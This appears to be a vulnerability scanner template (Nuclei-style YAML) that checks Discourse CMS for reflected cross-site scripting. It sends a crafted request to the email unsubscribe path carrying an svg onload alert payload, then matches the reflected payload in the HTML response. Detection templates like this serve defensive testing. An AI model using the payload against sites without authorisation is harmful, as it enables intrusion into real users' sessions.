id: discourse-xss
info:
  author: madrobot
  description: Cross-site scripting (XSS) on Discourse CMS
  name: Discourse CMS - XSS
  severity: medium
  tags: xss,discourse
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <svg/onload=alert(xss)>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E'
